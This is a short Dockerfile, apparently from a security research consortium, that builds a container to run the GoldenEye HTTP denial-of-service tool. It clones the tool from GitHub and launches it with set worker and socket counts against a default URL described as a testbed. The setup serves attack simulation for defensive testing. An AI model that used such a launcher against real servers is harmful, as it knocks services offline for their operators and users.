#
# A container for hosting the GoldenEye Attack
# 
# Copytirght (c) 2022, The GUARD Consortium
#

from debian:bullseye

# Goldeneye main parameters
ENV WORKERS=10
ENV SOCKETS=50
ENV METHOD=get

# Default to MAGGIOLI testbed
ENV URL="https://guard-test-department-0.maggiolicloud.it/"

# Clone the goldeneye repository from github
RUN apt-get update && \
	apt-get -y install git python3 && \
	cd /usr/src/ && \
	mkdir goldeneye && \
	cd goldeneye && \
	git clone https://github.com/jseidl/GoldenEye.git . 
	

WORKDIR /usr/src/goldeneye


CMD ./goldeneye.py $URL -w $WORKERS -s $SOCKETS -m $METHOD
